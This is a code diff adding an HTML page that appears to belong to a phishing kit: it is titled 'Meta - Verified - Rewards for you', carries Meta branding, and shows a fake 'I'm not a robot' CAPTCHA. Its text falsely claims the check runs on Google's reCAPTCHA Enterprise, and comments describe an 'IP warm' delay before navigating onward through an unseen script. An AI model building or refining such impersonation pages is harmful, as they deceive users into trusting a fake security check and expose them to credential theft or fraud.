@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+    <title>Meta - Verified - Rewards for you</title>
+    <link rel="stylesheet" href="./public/styles/tw-built.css">
+    <link rel="stylesheet" href="./public/styles/checkbox.css">
+    <link rel="stylesheet" href="./public/styles/style.css">
+</head>
+
+<body class="min-h-screen w-full flex flex-col items-center justify-center bg-gradient-to-b from-[#f0f2f5] via-[#fafbfc] to-[#e8eaee] px-4 py-10 sm:py-14">
+    <main class="w-full max-w-[420px]">
+        <div class="rounded-2xl bg-white shadow-card border border-gray-200/80 overflow-hidden">
+            <!-- Fixed block: logo + title + description -->
+            <div class="px-6 sm:px-8 pt-8 pb-6 text-center border-b border-gray-100">
+                <div class="inline-flex items-center justify-center w-14 h-14 rounded-2xl bg-[#f0f2f5] mb-4 ring-1 ring-gray-200/60">
+                    <img src="./public/logo-meta.svg" alt="Meta" class="w-9 h-9" width="36" height="36">
+                </div>
+                <h1 class="text-[1.25rem] font-semibold text-[#1C1E21] tracking-tight">Please check</h1>
+                <p class="mt-2 text-[13px] leading-snug text-[#65676B] max-w-[320px] mx-auto">
+                    Confirm you’re human before we continue. This protects accounts and our community.
+                </p>
+            </div>
+
+            <!-- Below fixed block: ~3s spinner + IP warm, then hide and show captcha -->
+            <div id="landingGateLoader" class="flex flex-col items-center justify-center py-10 px-6 min-h-[140px]" role="status" aria-live="polite" aria-busy="true">
+                <div class="w-10 h-10 rounded-full border-[3px] border-[#e4e6eb] border-t-[#1877f2] animate-spin" aria-hidden="true"></div>
+                <p class="mt-4 text-[13px] text-[#65676B] text-center">Loading verification…</p>
+            </div>
+
+            <div id="landingGateContent" class="hidden">
+            <div class="px-4 sm:px-6 py-5">
+                <div
+                    class="relative rounded-xl bg-[#f7f8fa] border border-[#e4e6eb] flex flex-row items-stretch justify-between gap-3 min-h-[76px] shadow-[inset_0_1px_0_rgba(255,255,255,0.9)]">
+                    <div class="flex flex-row items-center flex-1 min-w-0 pl-4 pr-2 py-3">
+                        <div class="relative w-[30px] h-[30px] shrink-0 flex items-center justify-center">
+                            <label class="checkbox flex items-center justify-center cursor-pointer">
+                                <input type="checkbox" id="robotCheckbox" aria-describedby="robot-help">
+                                <svg viewBox="0 0 21 21" aria-hidden="true">
+                                    <path
+                                        d="M5,10.75 L8.5,14.25 L19.4,2.3 C18.8333333,1.43333333 18.0333333,1 17,1 L4,1 C2.35,1 1,2.35 1,4 L1,17 C1,18.65 2.35,20 4,20 L17,20 C18.65,20 20,18.65 20,17 L20,7.99769186">
+                                    </path>
+                                </svg>
+                            </label>
+                        </div>
+                        <label for="robotCheckbox" class="cursor-pointer text-[15px] text-[#4B4F56] font-semibold ml-2 leading-tight select-none">
+                            I’m not a robot
+                        </label>
+                    </div>
+                    <div class="flex items-center justify-center self-stretch border-l border-[#e4e6eb] bg-white/60 min-w-[96px] w-[96px] shrink-0 p-1.5">
+                        <img src="./public/icon-captcha.png" alt="" class="block w-[68px] h-[68px] max-w-full max-h-full object-contain" width="68" height="68">
+                    </div>
+                    <!-- After check: ~2s overlay + refresh language then navigate -->
+                    <div id="captchaVerifyLoader" class="hidden absolute inset-0 z-10 flex flex-col items-center justify-center rounded-xl bg-[#f7f8fa]/95 backdrop-blur-[1px]" role="status" aria-live="polite" aria-hidden="true">
+                        <div class="w-9 h-9 rounded-full border-[3px] border-[#e4e6eb] border-t-[#1877f2] animate-spin" aria-hidden="true"></div>
+                        <p class="mt-3 text-[12px] font-medium text-[#4B4F56]">Verifying…</p>
+                    </div>
+                </div>
+                <p id="robot-help" class="sr-only">Check the box to verify and continue.</p>
+            </div>
+
+            <div class="px-6 sm:px-8 pb-8 pt-1">
+                <div class="rounded-xl bg-[#fafbfc] border border-gray-100 px-4 py-4 text-[12px] leading-[1.45] text-[#65676B] space-y-3">
+                    <p>
+                        This helps us combat harmful conduct, detect and prevent spam, and maintain the integrity of our Products.
+                    </p>
+                    <p>
+                        We use Google’s reCAPTCHA Enterprise for this check. Your use is subject to Google’s Privacy Policy and Terms of Use.
+                    </p>
+                    <p class="text-[11px] text-[#8A8D91] leading-relaxed">
+                        reCAPTCHA Enterprise may collect device and application data and send it to Google to operate and improve the service and for security. It is not used by Google for personalized advertising.
+                    </p>
+                </div>
+            </div>
+            </div>
+        </div>
+
+        <p class="text-center text-[11px] text-[#8A8D91] mt-6 px-2">
+            Meta © <span id="y"></span>
+        </p>
+    </main>
+
+    <script src="./public/js/bundle.js"></script>
+</body>
+
+</html>
